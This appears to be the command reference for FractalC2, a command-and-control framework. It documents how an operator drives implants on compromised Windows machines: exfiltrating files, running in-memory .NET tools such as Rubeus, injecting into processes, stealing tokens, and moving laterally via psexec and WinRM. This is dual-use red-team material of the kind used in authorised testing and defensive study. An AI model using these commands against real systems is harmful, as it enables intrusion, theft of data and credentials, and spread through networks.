# Agent Commands

This document lists the commands available for interacting with Agents in **FractalC2**. These commands are supported by both **WebCommander** and **Commander CLI**.

## Navigation & File System

Commands for exploring and manipulating the file system of the infected machine.

### `ls` / `dir`
**Description**: Lists the contents of a directory.
*   **Usage**: `ls [path]`
*   **Examples**:
    *   `ls` : Lists the current directory.
    *   `ls C:\Users` : Lists the contents of the specified folder.

### `cd`
**Description**: Changes the current working directory.
*   **Usage**: `cd <path>`
*   **Examples**:
    *   `cd Documents` : Moves to the Documents folder.
    *   `cd ..` : Moves to the parent directory.

### `pwd`
**Description**: Prints the current working directory.
*   **Usage**: `pwd`
*   **Examples**:
    *   `pwd` : Displays the full path of the current directory.

### `cat` / `type`
**Description**: Displays the content of a file.
*   **Usage**: `cat <filename>`
*   **Examples**:
    *   `cat notes.txt` : Reads and displays the content of notes.txt.

### `mkdir`
**Description**: Creates a new directory.
*   **Usage**: `mkdir <directory>`
*   **Examples**:
    *   `mkdir NewFolder`

### `rm` / `del`
**Description**: Removes a file.
*   **Usage**: `rm <filename>`
*   **Examples**:
    *   `rm old_file.txt`

### `rmdir`
**Description**: Removes a directory.
*   **Usage**: `rmdir <directory>`
*   **Examples**:
    *   `rmdir OldFolder`

### `download`
**Description**: Downloads a file from the agent to the TeamServer.
*   **Usage**: `download <remote_path>`
*   **Examples**:
    *   `download C:\Users\User\Desktop\secret.doc`

### `upload`
**Description**: Uploads a file from the TeamServer to the agent.
*   **Usage**: `upload <local_path> <remote_path>`
*   **Examples**:
    *   `upload tools.exe C:\Temp\tools.exe`

---

## Execution

Commands for executing code and binaries on the target.

### `shell`
**Description**: Executes a command using `cmd.exe /c`.
*   **Usage**: `shell <command>`
*   **Examples**:
    *   `shell whoami /all`
    *   `shell ipconfig`

### `powershell`
**Description**: Executes a PowerShell command or script block.
*   **Usage**: `powershell <command>`
*   **Examples**:
    *   `powershell Get-Process`
    *   `powershell "Get-Service | Where-Object {$_.Status -eq 'Running'}"`

### `execute-assembly`
**Description**: Executes a local .NET executable (assembly) in process memory on the target (Fork & Run).
*   **Usage**: `execute-assembly <local_path_tool_file_nameto_exe> [arguments]`
*   **Examples**:
    *   `execute-assembly Seatbelt.exe -group=user`

### `inline-assembly`
**Description**: Executes a local .NET assembly inside the agent's process (Be careful with stability).
*   **Usage**: `inline-assembly <tool_file_name> [arguments]`
*   **Examples**:
    *   `inline-assembly Rubeus.exe triage`

### `run`
**Description**: Executes a binary already present on the disk.
*   **Usage**: `run <path_to_executable> [arguments]`
*   **Examples**:
    *   `run C:\Windows\System32\calc.exe`

### `powershell-import`
**Description**: Imports a local PowerShell script into the agent's session for future use.
*   **Usage**: `powershell-import <tool_script_file_name>`
*   **Examples**:
    *   `powershell-import PowerView.ps1`

---

## System & Process

Commands for system enumeration and process management.

### `ps`
**Description**: Lists running processes.
*   **Usage**: `ps`
*   **Examples**:
    *   `ps` : Shows process ID, name, architecture, and user.

### `kill`
**Description**: Terminates a process by ID.
*   **Usage**: `kill <pid>`
*   **Examples**:
    *   `kill 1234`

### `whoami`
**Description**: Displays the current user name and privileges (internal command, cheaper than `shell whoami`).
*   **Usage**: `whoami`
*   **Examples**:
    *   `whoami`

### `migrate`
**Description**: Injects the agent into another process.
*   **Usage**: `migrate <pid>`
*   **Examples**:
    *   `migrate 4567` : Moves the beacon into process 4567.

---

## Network & Pivoting

Commands for network interactions and tunneling.

### `rportfwd`
**Description**: Sets up a reverse port forward. Traffic sent to a port on the TeamServer is forwarded to a destination reachable by the agent.
*   **Usage**: `rportfwd start <server_port> <dest_host> <dest_port>`
*   **Examples**:
    *   `rportfwd start 8080 192.168.1.50 80`

### `proxy` (SOCKS)
**Description**: Manages the SOCKS proxy server associated with the agent.
*   **Usage**: `proxy [start|stop] [port]`
*   **Examples**:
    *   `proxy start 1080` : Starts a SOCKS proxy on port 1080 of the TeamServer.

---

## Token Manipulation

Commands for managing Windows access tokens.

### `make-token`
**Description**: Creates a token for a specified user using plaintext credentials and impersonates it.
*   **Usage**: `make-token --username <DOMAIN\User> --password <password>`
*   **Examples**:
    *   `make-token --username CONTOSO\Administrator --password Password123!`

### `steal-token`
**Description**: Steals an access token from an existing process and impersonates it.
*   **Usage**: `steal-token <pid>`
*   **Examples**:
    *   `steal-token 888`

### `revert-self`
**Description**: Reverts the current thread token to the original process token (stops impersonation).
*   **Usage**: `revert-self`
*   **Examples**:
    *   `revert-self`

---

## Lateral Movement

Commands for moving laterally to other machines.

### `psexec`
**Description**: Executes a service binary on a remote machine using the Service Control Manager.
*   **Usage**: `psexec <target_machine> <service_name> <local_binary_path>`
*   **Examples**:
    *   `psexec Workstation01 MyService Agentsvc.exe`

### `winrm`
**Description**: Executes a command on a remote machine via WinRM (PowerShell Remoting).
*   **Usage**: `winrm <target_machine> <command>`
*   **Examples**:
    *   `winrm DC01 hostname`

---

## Agent Control

Commands for managing the agent itself.

### `sleep`
**Description**: Changes the sleep interval (check-in frequency) and jitter.
*   **Usage**: `sleep <seconds> [jitter_percent]`
*   **Examples**:
    *   `sleep 60` : Check in every 60 seconds.
    *   `sleep 10 20` : Check in every 10 seconds with 20% jitter.

### `checkin`
**Description**: Forces an immediate check-in (useful is sleep is long but you just queued commands).
*   **Usage**: `checkin`
*   **Examples**:
    *   `checkin`

### `destroy`
**Description**: Terminates the agent process.
*   **Usage**: `destroy`
*   **Examples**:
    *   `destroy`
